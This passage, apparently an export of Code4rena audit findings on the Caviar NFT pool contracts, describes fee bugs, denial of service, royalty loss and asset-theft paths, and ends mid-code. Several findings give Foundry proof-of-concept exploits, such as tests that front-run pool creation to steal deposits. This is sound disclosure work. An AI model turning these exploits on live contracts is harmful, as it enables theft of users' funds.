payable(address(privatePool)),         nft: address(milady),         inputTokenIds: inputTokenIds2,         inputTokenWeights: inputTokenWeights2,         inputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),         stolenNftProofs: new IStolenNftOracle.Message[](0),         outputTokenIds: outputTokenIds2,         outputTokenWeights: outputTokenWeights2,         outputProof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0))     });      (uint256 changeFee,) = privatePool.changeFeeQuote(inputTokenIds.length * 1e18);      //WARDEN: multiply with 10 just to make sure there really is enough     ethRouter.change{value: changeFee*10}(changes, 0);  }    ```    Output:  ``` ...     \u2502   \u251c\u2500 [0] PrivatePool::change{value: 50000000000000000000}([6], [], ([], []), [], [1], [], ([], []))      \u2502   \u2502   \u2514\u2500 \u2190 \"EvmError: OutOfFund\"     \u2502   \u2514\u2500 \u2190 \"EvmError: Revert\"     \u2514\u2500 \u2190 \"EvmError: Revert\" ```  </details>  ## Tools Used  Manual review  ## Recommended Mitigation Steps only send the required change fee and not `msg.value`"}, {"title": "Flash loan fee is incorrect in Private Pool contract", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/864", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752   # Vulnerability details  ## Impact  Private Pools support NFT borrowing using flash loans. Users that decide to use this feature have to pay a flash loan fee to the owner of the pool.  The contract has a `changeFee` variable that is used to configure the fee for changing NFTs, and this variable is also used to determine the fee for flash loans. In the case of a change operation, the value is interpreted as an amount with 4 decimals, and the token is the base token of the pool. This means that, for example, if the base token is ETH, a `changeFee` value of 25 should be interpreted as a fee of 0.0025 ETH for change operation.  However, as we can see in this following snippet, the `flashFee` function just returns the value of `changeFee` without any scaling or modification.  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752  ```solidity 750:     function flashFee(address, uint256) public view returns (uint256) { 751:         return changeFee; 752:     } ```  This means that, following the previous example, a `changeFee` value of 25 will result in 0.0025 ETH for change operation, but **just 25 wei for flash loans**. The [documentation](https://docs.caviar.sh/technical-reference/custom-pools/smart-contract-api/privatepool#changefee) hints that this value should also be scaled to 4 decimals in the case of the flash loan fee, but in any case this is clearly an incorrect setting of the flash loan fee.  ## Proof of Concept  In the following test, the pool is configured with a `changeFee` value of 25, and Alice is able to execute a flash loan by just paying 25 wei.  Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f).  ```solidity function test_PrivatePool_flashLoan_IncorrectFee() public {     // Setup pool     PrivatePool privatePool = new PrivatePool(         address(factory),         address(royaltyRegistry),         address(stolenNftOracle)     );     uint56 changeFee = 25;     privatePool.initialize(         address(0), // address _baseToken,         address(milady), // address _nft,         100e18, // uint128 _virtualBaseTokenReserves,         10e18, // uint128 _virtualNftReserves,         changeFee, // uint56 _changeFee,         0, // uint16 _feeRate,         bytes32(0), // bytes32 _merkleRoot,         false, // bool _useStolenNftOracle,         false // bool _payRoyalties     );          uint256 tokenId = 0;     milady.mint(address(privatePool), tokenId);          // Alice executes a flash loan     vm.startPrank(alice);          FlashLoanBorrower flashLoanBorrower = new FlashLoanBorrower();          // Alice just sends 25 wei!     vm.deal(alice, changeFee);     privatePool.flashLoan{value: changeFee}(flashLoanBorrower, address(milady), tokenId, \"\");          vm.stopPrank(); } ```  ## Recommendation  The `flashFee` function should properly scale the value of the `changeFee` variable, similar to how it is implemented in `changeFeeQuote`. "}, {"title": "`EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions can be DOS'ed for some ERC721 tokens", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/776", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209 https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248 https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293 https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672   # Vulnerability details  ## Impact The following `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions call the corresponding ERC721 tokens' `setApprovalForAll` functions.  https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L152-L209 ```solidity     function sell(Sell[] calldata sells, uint256 minOutputAmount, uint256 deadline, bool payRoyalties) public {         ...         // loop through and execute the sells         for (uint256 i = 0; i < sells.length; i++) {             ...             // approve the pair to transfer NFTs from the router             ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true);             ...         }         ...     } ```  https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L219-L248 ```solidity     function deposit(         address payable privatePool,         address nft,         uint256[] calldata tokenIds,         uint256 minPrice,         uint256 maxPrice,         uint256 deadline     ) public payable {         ...         // approve pair to transfer NFTs from router         ERC721(nft).setApprovalForAll(privatePool, true);         ...     } ```  https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L254-L293 ```solidity     function change(Change[] calldata changes, uint256 deadline) public payable {         ...         // loop through and execute the changes         for (uint256 i = 0; i < changes.length; i++) {             Change memory _change = changes[i];             ...             // approve pair to transfer NFTs from router             ERC721(_change.nft).setApprovalForAll(_change.pool, true);             ...         }         ...     } ```  For ERC721 tokens like Axie, which its `setApprovalForAll` function is shown below, calling their `setApprovalForAll` functions with the same `msg.sender`-`_operator`-`_approved` combination would revert because of requirements like `require(_tokenOperator[msg.sender][_operator] != _approved)`. For these ERC721 tokens, calling the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions for the first time, which call such tokens' `setApprovalForAll` functions for the first time, can succeed; however, calling the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions again, which call such tokens' `setApprovalForAll` functions with the same pool as `_operator` and `true` as `_approved` again, will revert. In this case, the `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions are DOS'ed for such ERC721 tokens.  https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d#code#L672 ```solidity   function setApprovalForAll(address _operator, bool _approved) external whenNotPaused {     require(_tokenOperator[msg.sender][_operator] != _approved);     _tokenOperator[msg.sender][_operator] = _approved;     ApprovalForAll(msg.sender, _operator, _approved);   } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `EthRouter.sell` function to sell 1 Axie NFT to a private pool, which succeeds. 2. Alice calls the `EthRouter.sell` function again to sell another Axie NFT to the same private pool. However, this function call's execution of `ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true)` reverts because Axie's `require(_tokenOperator[msg.sender][_operator] != _approved)` reverts. 3. Bob tries to repeat Step 2 but his `EthRouter.sell` function call also reverts. 4. Hence, the `EthRouter.sell` function is DOS'ed for selling any Axie NFTs to the same private pool for any users.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `EthRouter.sell`, `EthRouter.deposit`, and `EthRouter.change` functions can be respectively updated to check if the `EthRouter` contract has approved the corresponding pool to spend any of the corresponding ERC721 tokens received by itself. If not, the corresponding ERC721's `setApprovalForAll` function can be called; otherwise, the corresponding ERC721's `setApprovalForAll` function should not be called."}, {"title": "Flashloan fee is not distributed to the factory", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/697", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654   # Vulnerability details  ## Impact Flashloan fee is not distributed to the factory  ## Proof of Concept When user takes a flashloan, then [he pays a fee](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L651) to the PrivatePool. The problem is that the whole fee amount is sent to PrivatePool and factory receives nothing.  However, all other function of contract send some part of fees to the factory. For example, `change` function, which is similar to the `flashloan` as it doesn't change virtual nft and balance reserves. This function [calculates pool and protocol fees](https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L736-L737).  But in case of flashloan, only pool receives fees. ## Tools Used VsCode ## Recommended Mitigation Steps Send some part of flashloan fee to the factory."}, {"title": "Loss of funds for traders due to accounting error in royalty calculations", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/596", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L237-L281 https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L328-L355   # Vulnerability details  ## Impact The `PrivatePool.buy` and `PrivatePool.sell` functions intend to distribute royalty amount whenever NFTs are traded. The implementation of buy and sell looks like this: ```solidity     function buy(uint256[] calldata tokenIds, uint256[] calldata tokenWeights, MerkleMultiProof calldata proof)         public         payable         returns (uint256 netInputAmount, uint256 feeAmount, uint256 protocolFeeAmount)     {         // ...          // calculate the sale price (assume it's the same for each NFT even if weights differ)         uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;         uint256 royaltyFeeAmount = 0;         for (uint256 i = 0; i < tokenIds.length; i++) {             // transfer the NFT to the caller             ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);              if (payRoyalties) {                 // get the royalty fee for the NFT                 (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice);                  // add the royalty fee to the total royalty fee amount                 royaltyFeeAmount += royaltyFee;             }         }          // add the royalty fee amount to the net input aount         netInputAmount += royaltyFeeAmount;          // ...          if (payRoyalties) {             for (uint256 i = 0; i < tokenIds.length; i++) {                 // get the royalty fee for the NFT                 (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);                  // transfer the royalty fee to the recipient if it's greater than 0                 if (royaltyFee > 0 && recipient != address(0)) {                     if (baseToken != address(0)) {                         ERC20(baseToken).safeTransfer(recipient, royaltyFee);                     } else {                         recipient.safeTransferETH(royaltyFee);                     }                 }             }         }          // emit the buy event         emit Buy(tokenIds, tokenWeights, netInputAmount, feeAmount, protocolFeeAmount, royaltyFeeAmount);     }      function sell(         ...     ) public returns (...) {         // ...          uint256 royaltyFeeAmount = 0;         for (uint256 i = 0; i < tokenIds.length; i++) {             // transfer each nft from the caller             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);              if (payRoyalties) {                 // calculate the sale price (assume it's the same for each NFT even if weights differ)                 uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount) / tokenIds.length;                  // get the royalty fee for the NFT                 (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);                  // tally the royalty fee amount                 royaltyFeeAmount += royaltyFee;                  // transfer the royalty fee to the recipient if it's greater than 0                 if (royaltyFee > 0 && recipient != address(0)) {                     if (baseToken != address(0)) {                         ERC20(baseToken).safeTransfer(recipient, royaltyFee);                     } else {                         recipient.safeTransferETH(royaltyFee);                     }                 }             }         }          // subtract the royalty fee amount from the net output amount         netOutputAmount -= royaltyFeeAmount;          if (baseToken == address(0)) {             // transfer ETH to the caller             msg.sender.safeTransferETH(netOutputAmount);              // if the protocol fee is set then pay the protocol fee             if (protocolFeeAmount > 0) factory.safeTransferETH(protocolFeeAmount);         } else {             // transfer base tokens to the caller             ERC20(baseToken).transfer(msg.sender, netOutputAmount);              // if the protocol fee is set then pay the protocol fee             if (protocolFeeAmount > 0) ERC20(baseToken).safeTransfer(address(factory), protocolFeeAmount);         }          // ...     } ```  It should be noted that while calculating `royaltyFeeAmount` the the `recipient` address returned from `_getRoyalty` function is ignored and the returned `royaltyFee` is added to the `royaltyFeeAmount`. This cumulative royalty amount is then collected from the trader.  However while performing the actual royalty transfer to the royalty recipient the returned `recipient` address is validated to not be equal to 0. The royalty is only paid when the `recipient` address is non-zero.  This inconsistency between royalty collection and royalty distribution can cause loss of funds to the traders. In the cases when `royaltyFee` is non-zero but `recipient` address is zero, the fee will be collected from traders but won't be distributed to royalty recipient. Hence causing loss of funds to the traders.   As the creation of private pools is open to everyone, the likelyhood of this vulnerability is high.  ## Proof of Concept Consider this scenario: - A buyer initiates the `buy` call for an NFT. - The `PrivatePool.buy` function queries the `_getRoyalty` function which returns 10 WETH as the `royaltyFee` and `0x00` address as the royalty recipient. - This 10 WETH value will be added to the `royaltyFeeAmount` amount and will be collected from the buyer. - But since the recipient address is `0x00`, the 10 WETH royalty amount will not be distributed.  - The 10 WETH amount won't be returned to the buyer either. It just simply stays inside the pool contract. - The buyer here suffered loss of 10 WETH.  A similar scenario is possible for the NFT `sell` flow.  ## Tools Used Manual review  ## Recommended Mitigation Steps Consider collecting royalty amount from traders only when the royalty recipient is non-zero. ```solidity     if (royaltyFee > 0 && recipient != address(0)) {         royaltyFeeAmount += royaltyFee;     } ``` "}, {"title": "ProtocolFeeRate can be set beyond 100% to a value type(uint16).max (65536).. causing loss o fund due to excessive fees", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/541", "labels": ["bug", "downgraded by judge", "grade-a", "high quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/dc3c76674133c0c5f50348a3862431292c387654/src/Factory.sol#L142-L143   # Vulnerability details  ## Impact ProtocolFeeRate can be set beyond 100% to a value type(uint16).max (65536).. causing loss of funds due to excessive fees. ( >650% increase)  Code: https://github.com/code-423n4/2023-04-caviar/blob/dc3c76674133c0c5f50348a3862431292c387654/src/Factory.sol#L142-L143  ## Proof of Concept   forge test --match-contract Buy  --match-test test_PaysProtocolFeeWithBaseToken_5000 -vvvv  ``` solidity    function test_PaysProtocolFeeWithBaseToken_5000() public {         // arrange         privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));         privatePool.initialize(             address(shibaInu),             nft,             virtualBaseTokenReserves,             virtualNftReserves,             changeFee,             feeRate,             merkleRoot,             true,             false         );         // factory.setProtocolFeeRate(50001); // can be set to 50%         factory.setProtocolFeeRate(type(uint16).max); // protocolFee rate can be set above 100%          // assert as max value is now at 65535 mark up to > 650% protocol fee         assertEq(factory.protocolFeeRate(), type(uint16).max, \"can be set to above 100%\");     }  ```  Foundry Logs  ```  Running 1 test for test/PrivatePool/Buy.t.sol:BuyTest [PASS] test_PaysProtocolFeeWithBaseToken_5000() (gas: 3394213) Traces:   [3394213] BuyTest::test_PaysProtocolFeeWithBaseToken_5000()      \u251c\u2500 [3248407] \u2192 new PrivatePool@0x212224D2F2d262cd093eE13240ca4873fcCBbA3C     \u2502   \u2514\u2500 \u2190 16220 bytes of code     \u251c\u2500 [75537] PrivatePool::initialize(ShibaInu: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], Milady: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 100000000000000000000, 5000000000000000000, 0, 0, 0x0000000000000000000000000000000000000000000000000000000000000000, true, false)      \u2502   \u251c\u2500 emit Initialize(baseToken: ShibaInu: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], nft: Milady: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], virtualBaseTokenReserves: 100000000000000000000, virtualNftReserves: 5000000000000000000, changeFee: 0, feeRate: 0, merkleRoot: 0x0000000000000000000000000000000000000000000000000000000000000000, useStolenNftOracle: true, payRoyalties: false)     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [7521] Factory::setProtocolFeeRate(65535)      \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [419] Factory::protocolFeeRate() [staticcall]     \u2502   \u2514\u2500 \u2190 65535     \u2514\u2500 \u2190 ()  Test result: ok. 1 passed; 0 failed; finished in 6.16ms  ```  ## Tools Used - Foundry  ## Recommended Mitigation Steps  provide limits to fee rate, possibly two-step change, and emit the results:  ``` solidity      function setProtocolFeeRate(uint16 _protocolFeeRate) public onlyOwner {                   if (_protocolFeeRate > 10_000) revert FeeRateTooHigh()         protocolFeeRate = _protocolFeeRate;         // emit fee rate change     }  ``` "}, {"title": "Incorrect protocol fee is taken when changing NFTs", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/463", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L737   # Vulnerability details  ## Impact Incorrect protocol fee is taken when changing NFTs which results in profit loss for the Caviar protocol.  ## Proof of Concept The protocol fee in changeFeeQuote is calculated as a percentage of the feeAmount which is based on the input amount:  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L737 ```solidity function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {     ...     protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000; ```  This seems wrong as in buyQuote and sellQuote the protocol fee is calculated as a percentage of the input amount, not the pool fee amount:  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L703 ```solidity function buyQuote(uint256 outputAmount)     ...     protocolFeeAmount = inputAmount * Factory(factory).protocolFeeRate() / 10_000; ```  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L721 ```solidity function sellQuote(uint256 inputAmount)     ...     protocolFeeAmount = outputAmount * Factory(factory).protocolFeeRate() / 10_000; ```  This makes the protocol fee extremely low meaning a profit loss for the protocol.  ## Tools Used Manual review  ## Recommended Mitigation Steps protocolFeeAmount in changeFeeQuote should be a percentage of the input amount instead of the pool fee."}, {"title": "`Factory.create`: Predictability of pool address creates multiple issues.", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/419", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L92   # Vulnerability details  ## Impact The `Factory.create` function is responsible for creating new `PrivatePool`s. It does this using the `LibClone.cloneDeterministic` function.  ```solidity     function create(         ...         bytes32 _salt,         ...     ) public payable returns (PrivatePool privatePool) {         if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (_baseToken != address(0) && msg.value > 0)) {             revert PrivatePool.InvalidEthAmount();         }          // deploy a minimal proxy clone of the private pool implementation         privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));          // ...     } ```  The address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. Once the user's create transaction is broadcasted, the  `_salt` parameter can be viewed by anyone watching the public mempool.  This public readability of `_salt` parameter creates two issues:  1. Stealing of user's deposit amount. If a user intends to create new pool and deposit some funds in it then an attacker can frontrun the user's txns and capture the deposit amounts. Here is how this can happen:      - User broadcasts two txns, first one to create a pool with `XXX` as the salt and second one to deposit some ETH into the new pool.      - The attacker views these pending txns and frontruns them to create a PrivatePool for himself with same `XXX` salt.      - The new pool gets created for the attacker, the address of this pool will be same as what the user will be expecting for his pool.      - The user's create pool txn gets reverted but deposit txn gets executed successfully. Hence the user deposited ETH in  attacker's pool.      - Being the owner of the pool the attacker simply withdraws the deposited ETH from the PrivatePool.  2. DoS for `Factory.create`. If a user intends to create a PrivatePool, his create txn can be forcefully reverted by an attacker by deploying a pool for himself using the user's salt. Here is how this can happen:     - The user broadcasts the create pool txn with salt `XXX`.     - The attacker frontruns the user's txn and creates a pool for hiself using the same `XXX` salt.     - The user's original create txn gets reverted as attacker's pool already exist on the predetermined address.     - This attack can be repeated again and again resulting in DoS for the `Factory.create` function.  ## Proof of Concept These test cases were added to `test/PrivatePool/Withdraw.t.sol` file and were ran using `forge test --ffi --mp test/PrivatePool/Withdraw.t.sol --mt test_audit`  ```solidity     function test_audit_create_stealDeposit() public {         address user1 = makeAddr(\"user1\");         vm.deal(user1, 10 ether);         vm.startPrank(user1);          address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));          // tries to create pool and deposit funds         // 1. factory.create(...)         // 2. pool.deposit(...)          // but user2 frontruns the txns          address user2 = makeAddr(\"user2\");         changePrank(user2);          uint baseTokenAmount = 0;          PrivatePool pool = factory.create{value: baseTokenAmount}(             baseToken,             nft,             virtualBaseTokenReserves,             virtualNftReserves,             changeFee,             feeRate,             merkleRoot,             true,             false,             bytes32(0),             tokenIds,             baseTokenAmount         );         assertEq(predictedAddress, address(pool));         assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));          changePrank(user1);          vm.expectRevert(LibClone.DeploymentFailed.selector);         factory.create{value: baseTokenAmount}(             baseToken,             nft,             virtualBaseTokenReserves,             virtualNftReserves,             changeFee,             feeRate,             merkleRoot,             true,             false,             bytes32(0),             tokenIds,             baseTokenAmount         );          pool.deposit{ value: 10 ether }(tokenIds, 10 ether);         assertEq(address(pool).balance, 10 ether);          changePrank(user2);         pool.withdraw(address(0), tokenIds, address(0), 10 ether);         assertEq(address(pool).balance, 0);         assertEq(user2.balance, 10 ether);     }      function test_audit_create_DoS() public {         address user1 = makeAddr(\"user1\");         vm.deal(user1, 10 ether);         vm.startPrank(user1);          address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));          // user1 tries to create pool         // factory.create(...)          // but user2 frontruns the txn          address user2 = makeAddr(\"user2\");         changePrank(user2);          uint baseTokenAmount = 0;          PrivatePool pool = factory.create{value: baseTokenAmount}(             baseToken,             nft,             virtualBaseTokenReserves,             virtualNftReserves,             changeFee,             feeRate,             merkleRoot,             true,             false,             bytes32(0),             tokenIds,             baseTokenAmount         );         assertEq(predictedAddress, address(pool));         assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));          changePrank(user1);          vm.expectRevert(LibClone.DeploymentFailed.selector);         factory.create{value: baseTokenAmount}(             baseToken,             nft,             virtualBaseTokenReserves,             virtualNftReserves,             changeFee,             feeRate,             merkleRoot,             true,             false,             bytes32(0),             tokenIds,             baseTokenAmount         );     } ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Consider making the upcoming pool address user specific by combining the salt value with user's address. ```solidity     privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(         keccak256(abi.encode(msg.seender, _salt))     ))); ```"}, {"title": "Prohibition to create private pools with the factory NFT", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/353", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-12"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L157 https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623 https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514   # Vulnerability details  ## Impact Any [Factory NFTs](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L37) deposited into a Factory-PrivatePool can have all assets in the corresponding PrivatePools stolen by malicious users.  ## Proof of Concept Suppose there are two PrivatePools p1 and p2, `p1.nft = address(Factory)`, and `uint256(p1)` and `uint256(p2)` are deposited into p1. Malicious users can use [flashloan()](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623) to steal all the base tokens in p1 and p2: 1. Call `p1.flashloan()` to borrow the Factory NFT - `uint256(p1)` from p1. 2. In the flashloan callback, call `p1.withdraw()` to withdraw all the base tokens and the factory NFT - `uint256(p2)` from p1. 3. Return `uint256(p1)` to p1.  Suppose there are two PrivatePools p1 and p2, `p1.nft = address(Factory)`, and `uint256(p2)` is deposited into p1. Malicious users can use [flashloan()](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623) to steal all the base tokens and NFTs in p2: 1. Call `p1.flashloan()` to borrow factory NFT - `uint256(p2)` from p1. 2. In the flashloan callback, call `p2.withdraw()` to steal all the base tokens and NFTs in p2. 3. Return `uint256(p2)` to p1.  In addition, malicious users can also steal assets in p2 by: 1. [`p1.buy(uint256(p2))`](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L211) 2. [`p2.withdraw(...)`](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514) 3. [`p1.sell(uint256(p2)`](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L301).  ## Tools Used VS Code  ## Recommended Mitigation Steps To prevent users from misusing the protocol and causing financial losses, we should prohibit the creation of PrivatePools with the Factory NFT: ``` diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol index 75991e1..14ec386 100644 --- a/src/PrivatePool.sol +++ b/src/PrivatePool.sol @@ -171,6 +171,8 @@ contract PrivatePool is ERC721TokenReceiver {          // check that the fee rate is less than 50%          if (_feeRate > 5_000) revert FeeRateTooHigh();  +        require(_nft != factory, \"Unsupported NFT\"); +          // set the state variables          baseToken = _baseToken;          nft = _nft; ```  "}, {"title": "`changeFee` cannot be changed", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/236", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L179 https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738 https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752 https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L632 https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88   # Vulnerability details  ## Impact PrivatePools have a `changeFee` that also doubles as a flash fee. This fee is only set in the constructor and cannot be further changed. It is not marked as constant/immutable nor it would have any sense in doing so, as fees should be able to vary according to market conditions.  Without the ability to change the fee, over time, a pool may become obsolete simply due to it being unable to adapt to market conditions.  ## Proof of Concept  `changeFee` is set in the constructor:  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L179  ```Solidity     changeFee = _changeFee; ```  and used in `changeFeeQuote` to calculate the fee required to change a given amount of NFTs.   https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738  ```Solidity     uint256 feePerNft = changeFee * 10 ** exponent; ```  It is also used for flash loan fee calculation:  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752 ```Solidity     function flashFee(address, uint256) public view returns (uint256) {         return changeFee;     } ```  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L632  ```Solidity     uint256 fee = flashFee(token, tokenId); ```  The variable is also marked as public, indicating a forgotten setter.  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88 ```Solidity     /// @notice The change/flash fee to 4 decimals of precision. For example, 0.0025 ETH = 25. 500 USDC = 5_000_000.     uint56 public changeFee; ```  The variable is missing a setter function.  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Create a setter function for `changeFee` that is only callable by the admin. "}, {"title": "Pool tokens can be stolen via `PrivatePool.flashLoan` function from previous owner", "html_url": "https://github.com/code-423n4/2023-04-caviar-findings/issues/230", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-15"], "target": "2023-04-caviar-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L461 https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654   # Vulnerability details  ## Impact `PrivatePool.sol` ERC721 and ERC20 tokens can be stolen by the previous owner via `execute` and `flashLoan` functions (or by malicious approval by the current owner via `execute`)  ## Proof of Concept Let's say that Bob is the attacker and Alice is a regular user.  1.Bob creates a `PrivatePool.sol` where he deposits 5 ERC721 tokens and 500 USDC. 2.Then Bob creates a malicious contract (let's call it `PrivatePoolExploit.sol`) and this contract contains `onFlashLoan` (IERC3156FlashBorrower), `transferFrom` ,\u00a0`ownerOf`, `onERC721Received` functions (like ERC721 does) and an additional `attack` function. 3.Via `PrivatePool.execute` function Bob approves USDC spending (`type(uint).max`) and `setApprovalForAll` for ERC721 tokens 4.Since the ownership of `PrivatePool` is stored in `Factory.sol` as an ERC721 token, ownership can be sold on any ERC721 marketplace. Alice decides to buy Bob's `PrivatePool` and ownership is transferred to Alice. 5.Right after the ownership is transferred, Bob runs `PrivatePoolExploit.attack` function, which calls `PrivatePool.flashLoan` where `PrivatePoolExploit.transferFrom` will be called since the flash loan can be called on any address. 6. All the funds are stolen by Bob and Alice's\u00a0`PrivatePool` is left with nothing.  ### Here is a PoC example:  To run the test:  1.Save `PrivatePoolExploit.sol` under path `src/attacks/PrivatePoolExploit.sol` 2.Save `Attack.t.sol` under path `src/test/PrivatePool/Attack.t.sol` 3.Run the test with the command `forge test --match-contract AttackTest`  PrivatePoolExploit.sol ```solidity // SPDX-License-Identifier: MIT pragma solidity 